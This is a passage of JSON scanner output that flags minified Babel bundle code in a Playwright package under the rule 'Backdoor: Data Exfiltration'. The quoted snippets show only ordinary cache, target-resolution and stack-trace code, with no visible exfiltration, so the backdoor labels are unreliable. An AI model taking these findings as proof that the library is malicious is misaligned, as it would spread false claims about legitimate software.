                      "text": "leasedVersion)(t,e)?t.toLowerCase():$D(e,t);return[e,r]}function Ume(e){let t=Object.assign({},e);return delete t.esmodules,delete t.browsers,t}function Vme(e,t){let r=MD(e,{mobileToDesktop:!0,env:t});return Lme(r)}var LD=new Nme({max:64});function $me(e,t){let r=typeof e==\"string\"?e:e.join()+t,n=LD.get(r);return n||(n=Vme(e,t),LD.set(r,n)),Object.assign({},n)}function Wme(e={},t={}){var r,n;let{browsers:s,esmodules:i}=e,{configPath:a=\".\"}=t;jme(s);let o=Ume(e),l=Fme(o),c=!!s||Object.keys(l).length>0,f=!t.ignoreBrowserslistConfig&&!c;if(!s&&f&&(s=MD.loadConfig({config:t.configFile,path:a,env:t.brow",
                      "markdown": "`leasedVersion)(t,e)?t.toLowerCase():$D(e,t);return[e,r]}function Ume(e){let t=Object.assign({},e);return delete t.esmodules,delete t.browsers,t}function Vme(e,t){let r=MD(e,{mobileToDesktop:!0,env:t});return Lme(r)}var LD=new Nme({max:64});function $me(e,t){let r=typeof e==\"string\"?e:e.join()+t,n=LD.get(r);return n||(n=Vme(e,t),LD.set(r,n)),Object.assign({},n)}function Wme(e={},t={}){var r,n;let{browsers:s,esmodules:i}=e,{configPath:a=\".\"}=t;jme(s);let o=Ume(e),l=Fme(o),c=!!s||Object.keys(l).length>0,f=!t.ignoreBrowserslistConfig&&!c;if(!s&&f&&(s=MD.loadConfig({config:t.configFile,path:a,env:t.brow`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1726,
                  "startColumn": 22930,
                  "endLine": 1726,
                  "endColumn": 22935,
                  "snippet": {
                    "text": ".semverify)(i),a.toString())}).length===0}function FD(e,t,{compatData:r=Ime,includes:n,excludes:s}={}){return s!=null&&s.has(e)?!1:n!=null&&n.has(e)?!0:!BD(t,r[e])}function Ome(e,t,r,n,s,i,a){let o=new Set,l={compatData:e,includes:t,excludes:r};for(let u in e)if(FD(u,n,l))o.add(u);else if(a){let c=a.get(u);c&&o.add(c)}return s==null||s.forEach(u=>!r.has(u)&&o.add(u)),i==null||i.forEach(u=>!t.has(u)&&o.delete(u)),o}});var eb=E(Sn=>{\"use strict\";Object.defineProperty(Sn,\"__esModule\",{value:!0});Object.defineProperty(Sn,\"TargetNames\",{enumerable:!0,get:function(){return Qg.TargetNames}});Sn.default=Wm",
                    "rendered": {
                      "text": ".semverify)(i),a.toString())}).length===0}function FD(e,t,{compatData:r=Ime,includes:n,excludes:s}={}){return s!=null&&s.has(e)?!1:n!=null&&n.has(e)?!0:!BD(t,r[e])}function Ome(e,t,r,n,s,i,a){let o=new Set,l={compatData:e,includes:t,excludes:r};for(let u in e)if(FD(u,n,l))o.add(u);else if(a){let c=a.get(u);c&&o.add(c)}return s==null||s.forEach(u=>!r.has(u)&&o.add(u)),i==null||i.forEach(u=>!t.has(u)&&o.delete(u)),o}});var eb=E(Sn=>{\"use strict\";Object.defineProperty(Sn,\"__esModule\",{value:!0});Object.defineProperty(Sn,\"TargetNames\",{enumerable:!0,get:function(){return Qg.TargetNames}});Sn.default=Wm",
                      "markdown": "`.semverify)(i),a.toString())}).length===0}function FD(e,t,{compatData:r=Ime,includes:n,excludes:s}={}){return s!=null&&s.has(e)?!1:n!=null&&n.has(e)?!0:!BD(t,r[e])}function Ome(e,t,r,n,s,i,a){let o=new Set,l={compatData:e,includes:t,excludes:r};for(let u in e)if(FD(u,n,l))o.add(u);else if(a){let c=a.get(u);c&&o.add(c)}return s==null||s.forEach(u=>!r.has(u)&&o.add(u)),i==null||i.forEach(u=>!t.has(u)&&o.delete(u)),o}});var eb=E(Sn=>{\"use strict\";Object.defineProperty(Sn,\"__esModule\",{value:!0});Object.defineProperty(Sn,\"TargetNames\",{enumerable:!0,get:function(){return Qg.TargetNames}});Sn.default=Wm`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1726,
                  "startColumn": 8784,
                  "endLine": 1726,
                  "endColumn": 8789,
                  "snippet": {
                    "text": "l;return t?(ga(this,t),t.value):null}del(t){ga(this,this[sn].get(t))}load(t){this.reset();let r=Date.now();for(let n=t.length-1;n>=0;n--){let s=t[n],i=s.e||0;if(i===0)this.set(s.k,s.v);else{let a=i-r;a>0&&this.set(s.k,s.v,a)}}}prune(){this[sn].forEach((t,r)=>Gg(this,r,!1))}},Gg=(e,t,r)=>{let n=e[sn].get(t);if(n){let s=n.value;if(df(e,s)){if(ga(e,n),!e[el])return}else r&&(e[ED]&&(n.value.now=Date.now()),e[Ht].unshiftNode(n));return s.value}},df=(e,t)=>{if(!t||!t.maxAge&&!e[Ei])return!1;let r=Date.now()-t.now;return t.maxAge?r>t.maxAge:e[Ei]&&r>e[Ei]},Zo=e=>{if(e[Hn]>e[bi])for(let t=e[Ht].tail;e[Hn]>",
                    "rendered": {
                      "text": "l;return t?(ga(this,t),t.value):null}del(t){ga(this,this[sn].get(t))}load(t){this.reset();let r=Date.now();for(let n=t.length-1;n>=0;n--){let s=t[n],i=s.e||0;if(i===0)this.set(s.k,s.v);else{let a=i-r;a>0&&this.set(s.k,s.v,a)}}}prune(){this[sn].forEach((t,r)=>Gg(this,r,!1))}},Gg=(e,t,r)=>{let n=e[sn].get(t);if(n){let s=n.value;if(df(e,s)){if(ga(e,n),!e[el])return}else r&&(e[ED]&&(n.value.now=Date.now()),e[Ht].unshiftNode(n));return s.value}},df=(e,t)=>{if(!t||!t.maxAge&&!e[Ei])return!1;let r=Date.now()-t.now;return t.maxAge?r>t.maxAge:e[Ei]&&r>e[Ei]},Zo=e=>{if(e[Hn]>e[bi])for(let t=e[Ht].tail;e[Hn]>",
                      "markdown": "`l;return t?(ga(this,t),t.value):null}del(t){ga(this,this[sn].get(t))}load(t){this.reset();let r=Date.now();for(let n=t.length-1;n>=0;n--){let s=t[n],i=s.e||0;if(i===0)this.set(s.k,s.v);else{let a=i-r;a>0&&this.set(s.k,s.v,a)}}}prune(){this[sn].forEach((t,r)=>Gg(this,r,!1))}},Gg=(e,t,r)=>{let n=e[sn].get(t);if(n){let s=n.value;if(df(e,s)){if(ga(e,n),!e[el])return}else r&&(e[ED]&&(n.value.now=Date.now()),e[Ht].unshiftNode(n));return s.value}},df=(e,t)=>{if(!t||!t.maxAge&&!e[Ei])return!1;let r=Date.now()-t.now;return t.maxAge?r>t.maxAge:e[Ei]&&r>e[Ei]},Zo=e=>{if(e[Hn]>e[bi])for(let t=e[Ht].tail;e[Hn]>`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1726,
                  "startColumn": 8544,
                  "endLine": 1726,
                  "endColumn": 8549,
                  "snippet": {
                    "text": "Hn]+=a.length,this[Ht].unshift(a),this[sn].set(t,this[Ht].head),Zo(this),!0)}has(t){if(!this[sn].has(t))return!1;let r=this[sn].get(t).value;return!df(this,r)}get(t){return Gg(this,t,!0)}peek(t){return Gg(this,t,!1)}pop(){let t=this[Ht].tail;return t?(ga(this,t),t.value):null}del(t){ga(this,this[sn].get(t))}load(t){this.reset();let r=Date.now();for(let n=t.length-1;n>=0;n--){let s=t[n],i=s.e||0;if(i===0)this.set(s.k,s.v);else{let a=i-r;a>0&&this.set(s.k,s.v,a)}}}prune(){this[sn].forEach((t,r)=>Gg(this,r,!1))}},Gg=(e,t,r)=>{let n=e[sn].get(t);if(n){let s=n.value;if(df(e,s)){if(ga(e,n),!e[el])return}",
                    "rendered": {
                      "text": "Hn]+=a.length,this[Ht].unshift(a),this[sn].set(t,this[Ht].head),Zo(this),!0)}has(t){if(!this[sn].has(t))return!1;let r=this[sn].get(t).value;return!df(this,r)}get(t){return Gg(this,t,!0)}peek(t){return Gg(this,t,!1)}pop(){let t=this[Ht].tail;return t?(ga(this,t),t.value):null}del(t){ga(this,this[sn].get(t))}load(t){this.reset();let r=Date.now();for(let n=t.length-1;n>=0;n--){let s=t[n],i=s.e||0;if(i===0)this.set(s.k,s.v);else{let a=i-r;a>0&&this.set(s.k,s.v,a)}}}prune(){this[sn].forEach((t,r)=>Gg(this,r,!1))}},Gg=(e,t,r)=>{let n=e[sn].get(t);if(n){let s=n.value;if(df(e,s)){if(ga(e,n),!e[el])return}",
                      "markdown": "`Hn]+=a.length,this[Ht].unshift(a),this[sn].set(t,this[Ht].head),Zo(this),!0)}has(t){if(!this[sn].has(t))return!1;let r=this[sn].get(t).value;return!df(this,r)}get(t){return Gg(this,t,!0)}peek(t){return Gg(this,t,!1)}pop(){let t=this[Ht].tail;return t?(ga(this,t),t.value):null}del(t){ga(this,this[sn].get(t))}load(t){this.reset();let r=Date.now();for(let n=t.length-1;n>=0;n--){let s=t[n],i=s.e||0;if(i===0)this.set(s.k,s.v);else{let a=i-r;a>0&&this.set(s.k,s.v,a)}}}prune(){this[sn].forEach((t,r)=>Gg(this,r,!1))}},Gg=(e,t,r)=>{let n=e[sn].get(t);if(n){let s=n.value;if(df(e,s)){if(ga(e,n),!e[el])return}`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1726,
                  "startColumn": 8371,
                  "endLine": 1726,
                  "endColumn": 8376,
                  "snippet": {
                    "text": "e)),l.now=s,l.maxAge=n,l.value=r,this[Hn]+=i-l.length,l.length=i,this.get(t),Zo(this),!0}let a=new Yg(t,r,i,s,n);return a.length>this[bi]?(this[Gn]&&this[Gn](t,r),!1):(this[Hn]+=a.length,this[Ht].unshift(a),this[sn].set(t,this[Ht].head),Zo(this),!0)}has(t){if(!this[sn].has(t))return!1;let r=this[sn].get(t).value;return!df(this,r)}get(t){return Gg(this,t,!0)}peek(t){return Gg(this,t,!1)}pop(){let t=this[Ht].tail;return t?(ga(this,t),t.value):null}del(t){ga(this,this[sn].get(t))}load(t){this.reset();let r=Date.now();for(let n=t.length-1;n>=0;n--){let s=t[n],i=s.e||0;if(i===0)this.set(s.k,s.v);else{le",
                    "rendered": {
                      "text": "e)),l.now=s,l.maxAge=n,l.value=r,this[Hn]+=i-l.length,l.length=i,this.get(t),Zo(this),!0}let a=new Yg(t,r,i,s,n);return a.length>this[bi]?(this[Gn]&&this[Gn](t,r),!1):(this[Hn]+=a.length,this[Ht].unshift(a),this[sn].set(t,this[Ht].head),Zo(this),!0)}has(t){if(!this[sn].has(t))return!1;let r=this[sn].get(t).value;return!df(this,r)}get(t){return Gg(this,t,!0)}peek(t){return Gg(this,t,!1)}pop(){let t=this[Ht].tail;return t?(ga(this,t),t.value):null}del(t){ga(this,this[sn].get(t))}load(t){this.reset();let r=Date.now();for(let n=t.length-1;n>=0;n--){let s=t[n],i=s.e||0;if(i===0)this.set(s.k,s.v);else{le",
                      "markdown": "`e)),l.now=s,l.maxAge=n,l.value=r,this[Hn]+=i-l.length,l.length=i,this.get(t),Zo(this),!0}let a=new Yg(t,r,i,s,n);return a.length>this[bi]?(this[Gn]&&this[Gn](t,r),!1):(this[Hn]+=a.length,this[Ht].unshift(a),this[sn].set(t,this[Ht].head),Zo(this),!0)}has(t){if(!this[sn].has(t))return!1;let r=this[sn].get(t).value;return!df(this,r)}get(t){return Gg(this,t,!0)}peek(t){return Gg(this,t,!1)}pop(){let t=this[Ht].tail;return t?(ga(this,t),t.value):null}del(t){ga(this,this[sn].get(t))}load(t){this.reset();let r=Date.now();for(let n=t.length-1;n>=0;n--){let s=t[n],i=s.e||0;if(i===0)this.set(s.k,s.v);else{le`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1726,
                  "startColumn": 8140,
                  "endLine": 1726,
                  "endColumn": 8145,
                  "snippet": {
                    "text": "ber\")throw new TypeError(\"maxAge must be a number\");let s=n?Date.now():0,i=this[ya](r,t);if(this[sn].has(t)){if(i>this[bi])return ga(this,this[sn].get(t)),!1;let l=this[sn].get(t).value;return this[Gn]&&(this[gD]||this[Gn](t,l.value)),l.now=s,l.maxAge=n,l.value=r,this[Hn]+=i-l.length,l.length=i,this.get(t),Zo(this),!0}let a=new Yg(t,r,i,s,n);return a.length>this[bi]?(this[Gn]&&this[Gn](t,r),!1):(this[Hn]+=a.length,this[Ht].unshift(a),this[sn].set(t,this[Ht].head),Zo(this),!0)}has(t){if(!this[sn].has(t))return!1;let r=this[sn].get(t).value;return!df(this,r)}get(t){return Gg(this,t,!0)}peek(t){return",
                    "rendered": {
                      "text": "ber\")throw new TypeError(\"maxAge must be a number\");let s=n?Date.now():0,i=this[ya](r,t);if(this[sn].has(t)){if(i>this[bi])return ga(this,this[sn].get(t)),!1;let l=this[sn].get(t).value;return this[Gn]&&(this[gD]||this[Gn](t,l.value)),l.now=s,l.maxAge=n,l.value=r,this[Hn]+=i-l.length,l.length=i,this.get(t),Zo(this),!0}let a=new Yg(t,r,i,s,n);return a.length>this[bi]?(this[Gn]&&this[Gn](t,r),!1):(this[Hn]+=a.length,this[Ht].unshift(a),this[sn].set(t,this[Ht].head),Zo(this),!0)}has(t){if(!this[sn].has(t))return!1;let r=this[sn].get(t).value;return!df(this,r)}get(t){return Gg(this,t,!0)}peek(t){return",
                      "markdown": "`ber\")throw new TypeError(\"maxAge must be a number\");let s=n?Date.now():0,i=this[ya](r,t);if(this[sn].has(t)){if(i>this[bi])return ga(this,this[sn].get(t)),!1;let l=this[sn].get(t).value;return this[Gn]&&(this[gD]||this[Gn](t,l.value)),l.now=s,l.maxAge=n,l.value=r,this[Hn]+=i-l.length,l.length=i,this.get(t),Zo(this),!0}let a=new Yg(t,r,i,s,n);return a.length>this[bi]?(this[Gn]&&this[Gn](t,r),!1):(this[Hn]+=a.length,this[Ht].unshift(a),this[sn].set(t,this[Ht].head),Zo(this),!0)}has(t){if(!this[sn].has(t))return!1;let r=this[sn].get(t).value;return!df(this,r)}get(t){return Gg(this,t,!0)}peek(t){return`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1726,
                  "startColumn": 8012,
                  "endLine": 1726,
                  "endColumn": 8017,
                  "snippet": {
                    "text": "v:t.value,e:t.now+(t.maxAge||0)}).toArray().filter(t=>t)}dumpLru(){return this[Ht]}set(t,r,n){if(n=n||this[Ei],n&&typeof n!=\"number\")throw new TypeError(\"maxAge must be a number\");let s=n?Date.now():0,i=this[ya](r,t);if(this[sn].has(t)){if(i>this[bi])return ga(this,this[sn].get(t)),!1;let l=this[sn].get(t).value;return this[Gn]&&(this[gD]||this[Gn](t,l.value)),l.now=s,l.maxAge=n,l.value=r,this[Hn]+=i-l.length,l.length=i,this.get(t),Zo(this),!0}let a=new Yg(t,r,i,s,n);return a.length>this[bi]?(this[Gn]&&this[Gn](t,r),!1):(this[Hn]+=a.length,this[Ht].unshift(a),this[sn].set(t,this[Ht].head),Zo(this),",
                    "rendered": {
                      "text": "v:t.value,e:t.now+(t.maxAge||0)}).toArray().filter(t=>t)}dumpLru(){return this[Ht]}set(t,r,n){if(n=n||this[Ei],n&&typeof n!=\"number\")throw new TypeError(\"maxAge must be a number\");let s=n?Date.now():0,i=this[ya](r,t);if(this[sn].has(t)){if(i>this[bi])return ga(this,this[sn].get(t)),!1;let l=this[sn].get(t).value;return this[Gn]&&(this[gD]||this[Gn](t,l.value)),l.now=s,l.maxAge=n,l.value=r,this[Hn]+=i-l.length,l.length=i,this.get(t),Zo(this),!0}let a=new Yg(t,r,i,s,n);return a.length>this[bi]?(this[Gn]&&this[Gn](t,r),!1):(this[Hn]+=a.length,this[Ht].unshift(a),this[sn].set(t,this[Ht].head),Zo(this),",
                      "markdown": "`v:t.value,e:t.now+(t.maxAge||0)}).toArray().filter(t=>t)}dumpLru(){return this[Ht]}set(t,r,n){if(n=n||this[Ei],n&&typeof n!=\"number\")throw new TypeError(\"maxAge must be a number\");let s=n?Date.now():0,i=this[ya](r,t);if(this[sn].has(t)){if(i>this[bi])return ga(this,this[sn].get(t)),!1;let l=this[sn].get(t).value;return this[Gn]&&(this[gD]||this[Gn](t,l.value)),l.now=s,l.maxAge=n,l.value=r,this[Hn]+=i-l.length,l.length=i,this.get(t),Zo(this),!0}let a=new Yg(t,r,i,s,n);return a.length>this[bi]?(this[Gn]&&this[Gn](t,r),!1):(this[Hn]+=a.length,this[Ht].unshift(a),this[sn].set(t,this[Ht].head),Zo(this),`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1726,
                  "startColumn": 7986,
                  "endLine": 1726,
                  "endColumn": 7991,
                  "snippet": {
                    "text": "t=>df(this,t)?!1:{k:t.key,v:t.value,e:t.now+(t.maxAge||0)}).toArray().filter(t=>t)}dumpLru(){return this[Ht]}set(t,r,n){if(n=n||this[Ei],n&&typeof n!=\"number\")throw new TypeError(\"maxAge must be a number\");let s=n?Date.now():0,i=this[ya](r,t);if(this[sn].has(t)){if(i>this[bi])return ga(this,this[sn].get(t)),!1;let l=this[sn].get(t).value;return this[Gn]&&(this[gD]||this[Gn](t,l.value)),l.now=s,l.maxAge=n,l.value=r,this[Hn]+=i-l.length,l.length=i,this.get(t),Zo(this),!0}let a=new Yg(t,r,i,s,n);return a.length>this[bi]?(this[Gn]&&this[Gn](t,r),!1):(this[Hn]+=a.length,this[Ht].unshift(a),this[sn].set(",
                    "rendered": {
                      "text": "t=>df(this,t)?!1:{k:t.key,v:t.value,e:t.now+(t.maxAge||0)}).toArray().filter(t=>t)}dumpLru(){return this[Ht]}set(t,r,n){if(n=n||this[Ei],n&&typeof n!=\"number\")throw new TypeError(\"maxAge must be a number\");let s=n?Date.now():0,i=this[ya](r,t);if(this[sn].has(t)){if(i>this[bi])return ga(this,this[sn].get(t)),!1;let l=this[sn].get(t).value;return this[Gn]&&(this[gD]||this[Gn](t,l.value)),l.now=s,l.maxAge=n,l.value=r,this[Hn]+=i-l.length,l.length=i,this.get(t),Zo(this),!0}let a=new Yg(t,r,i,s,n);return a.length>this[bi]?(this[Gn]&&this[Gn](t,r),!1):(this[Hn]+=a.length,this[Ht].unshift(a),this[sn].set(",
                      "markdown": "`t=>df(this,t)?!1:{k:t.key,v:t.value,e:t.now+(t.maxAge||0)}).toArray().filter(t=>t)}dumpLru(){return this[Ht]}set(t,r,n){if(n=n||this[Ei],n&&typeof n!=\"number\")throw new TypeError(\"maxAge must be a number\");let s=n?Date.now():0,i=this[ya](r,t);if(this[sn].has(t)){if(i>this[bi])return ga(this,this[sn].get(t)),!1;let l=this[sn].get(t).value;return this[Gn]&&(this[gD]||this[Gn](t,l.value)),l.now=s,l.maxAge=n,l.value=r,this[Hn]+=i-l.length,l.length=i,this.get(t),Zo(this),!0}let a=new Yg(t,r,i,s,n);return a.length>this[bi]?(this[Gn]&&this[Gn](t,r),!1):(this[Hn]+=a.length,this[Ht].unshift(a),this[sn].set(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1708,
                  "startColumn": 12957,
                  "endLine": 1708,
                  "endColumn": 12962,
                  "snippet": {
                    "text": "tackTraceLimit&&(Error.stackTraceLimit=Math.max(Error.stackTraceLimit,t)),Error.prepareStackTrace=function(n,s){let i=[],o=R2.has(n)?\"hiding\":\"unknown\";for(let l=0;l<s.length;l++){let u=s[l].getFunctionName();if(u===L2)o=\"hiding\";else if(u===M2){if(o===\"hiding\")o=\"showing\",qc.has(n)&&i.unshift(...qc.get(n));else if(o===\"unknown\"){i=s;break}}else o!==\"hiding\"&&i.push(s[l])}return e(n,i)}}function dhe(e,t){return t.length===0?j2(e):`${j2(e)}\n    at ${t.join(`\n    at `)}`}});var di=E(Vc=>{\"use strict\";Object.defineProperty(Vc,\"__esModule\",{value:!0});Vc.default=void 0;var U2=Un(),hg=class extends Erro",
                    "rendered": {
                      "text": "tackTraceLimit&&(Error.stackTraceLimit=Math.max(Error.stackTraceLimit,t)),Error.prepareStackTrace=function(n,s){let i=[],o=R2.has(n)?\"hiding\":\"unknown\";for(let l=0;l<s.length;l++){let u=s[l].getFunctionName();if(u===L2)o=\"hiding\";else if(u===M2){if(o===\"hiding\")o=\"showing\",qc.has(n)&&i.unshift(...qc.get(n));else if(o===\"unknown\"){i=s;break}}else o!==\"hiding\"&&i.push(s[l])}return e(n,i)}}function dhe(e,t){return t.length===0?j2(e):`${j2(e)}\n    at ${t.join(`\n    at `)}`}});var di=E(Vc=>{\"use strict\";Object.defineProperty(Vc,\"__esModule\",{value:!0});Vc.default=void 0;var U2=Un(),hg=class extends Erro",
                      "markdown": "`tackTraceLimit&&(Error.stackTraceLimit=Math.max(Error.stackTraceLimit,t)),Error.prepareStackTrace=function(n,s){let i=[],o=R2.has(n)?\"hiding\":\"unknown\";for(let l=0;l<s.length;l++){let u=s[l].getFunctionName();if(u===L2)o=\"hiding\";else if(u===M2){if(o===\"hiding\")o=\"showing\",qc.has(n)&&i.unshift(...qc.get(n));else if(o===\"unknown\"){i=s;break}}else o!==\"hiding\"&&i.push(s[l])}return e(n,i)}}function dhe(e,t){return t.length===0?j2(e):`${j2(e)}\n    at ${t.join(`\n    at `)}`}});var di=E(Vc=>{\"use strict\";Object.defineProperty(Vc,\"__esModule\",{value:!0});Vc.default=void 0;var U2=Un(),hg=class extends Erro`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1708,
                  "startColumn": 12290,
                  "endLine": 1708,
                  "endColumn": 12295,
                  "snippet": {
                    "text": "w WeakSet,qc=new WeakMap;function lhe(e){return Object.create({isNative:()=>!1,isConstructor:()=>!1,isToplevel:()=>!0,getFileName:()=>e,getLineNumber:()=>{},getColumnNumber:()=>{},getFunctionName:()=>{},getMethodName:()=>{},getTypeName:()=>{},toString:()=>e})}function uhe(e,t){if(!Uc)return;let r=qc.get(e);return r||qc.set(e,r=[]),r.push(lhe(t)),e}function che(e){if(Uc)return R2.add(e),e}function fhe(e){return Uc?Object.defineProperty(function(...t){return q2(),e(...t)},\"name\",{value:M2}):e}function phe(e){return Uc?Object.defineProperty(function(...t){return e(...t)},\"name\",{value:L2}):e}function ",
                    "rendered": {
                      "text": "w WeakSet,qc=new WeakMap;function lhe(e){return Object.create({isNative:()=>!1,isConstructor:()=>!1,isToplevel:()=>!0,getFileName:()=>e,getLineNumber:()=>{},getColumnNumber:()=>{},getFunctionName:()=>{},getMethodName:()=>{},getTypeName:()=>{},toString:()=>e})}function uhe(e,t){if(!Uc)return;let r=qc.get(e);return r||qc.set(e,r=[]),r.push(lhe(t)),e}function che(e){if(Uc)return R2.add(e),e}function fhe(e){return Uc?Object.defineProperty(function(...t){return q2(),e(...t)},\"name\",{value:M2}):e}function phe(e){return Uc?Object.defineProperty(function(...t){return e(...t)},\"name\",{value:L2}):e}function ",
                      "markdown": "`w WeakSet,qc=new WeakMap;function lhe(e){return Object.create({isNative:()=>!1,isConstructor:()=>!1,isToplevel:()=>!0,getFileName:()=>e,getLineNumber:()=>{},getColumnNumber:()=>{},getFunctionName:()=>{},getMethodName:()=>{},getTypeName:()=>{},toString:()=>e})}function uhe(e,t){if(!Uc)return;let r=qc.get(e);return r||qc.set(e,r=[]),r.push(lhe(t)),e}function che(e){if(Uc)return R2.add(e),e}function fhe(e){return Uc?Object.defineProperty(function(...t){return q2(),e(...t)},\"name\",{value:M2}):e}function phe(e){return Uc?Object.defineProperty(function(...t){return e(...t)},\"name\",{value:L2}):e}function `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1708,
                  "startColumn": 8057,
                  "endLine": 1708,
                  "endColumn": 8062,
                  "snippet": {
                    "text": "tion*the(e,t,r,n,s){let i=yield*D2(t,n,s);if(i.valid)return i;if(e){let a=yield*D2(r,n,s);if(a.valid)return{valid:!0,value:yield*(0,ua.waitFor)(a.value.promise)}}return{valid:!1,value:null}}function rhe(e,t,r){let n=new ug;return B2(t,e,r,n),n}function B2(e,t,r,n){t.configured()||t.forever();let s=e.get(r);switch(t.deactivate(),t.mode()){case\"forever\":s=[{value:n,valid:Qde}],e.set(r,s);break;case\"invalidate\":s=[{value:n,valid:t.validator()}],e.set(r,s);break;case\"valid\":s?s.push({value:n,valid:t.validator()}):(s=[{value:n,valid:t.validator()}],e.set(r,s))}}var lg=class{constructor(t){this._active=!",
                    "rendered": {
                      "text": "tion*the(e,t,r,n,s){let i=yield*D2(t,n,s);if(i.valid)return i;if(e){let a=yield*D2(r,n,s);if(a.valid)return{valid:!0,value:yield*(0,ua.waitFor)(a.value.promise)}}return{valid:!1,value:null}}function rhe(e,t,r){let n=new ug;return B2(t,e,r,n),n}function B2(e,t,r,n){t.configured()||t.forever();let s=e.get(r);switch(t.deactivate(),t.mode()){case\"forever\":s=[{value:n,valid:Qde}],e.set(r,s);break;case\"invalidate\":s=[{value:n,valid:t.validator()}],e.set(r,s);break;case\"valid\":s?s.push({value:n,valid:t.validator()}):(s=[{value:n,valid:t.validator()}],e.set(r,s))}}var lg=class{constructor(t){this._active=!",
                      "markdown": "`tion*the(e,t,r,n,s){let i=yield*D2(t,n,s);if(i.valid)return i;if(e){let a=yield*D2(r,n,s);if(a.valid)return{valid:!0,value:yield*(0,ua.waitFor)(a.value.promise)}}return{valid:!1,value:null}}function rhe(e,t,r){let n=new ug;return B2(t,e,r,n),n}function B2(e,t,r,n){t.configured()||t.forever();let s=e.get(r);switch(t.deactivate(),t.mode()){case\"forever\":s=[{value:n,valid:Qde}],e.set(r,s);break;case\"invalidate\":s=[{value:n,valid:t.validator()}],e.set(r,s);break;case\"valid\":s?s.push({value:n,valid:t.validator()}):(s=[{value:n,valid:t.validator()}],e.set(r,s))}}var lg=class{constructor(t){this._active=!`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
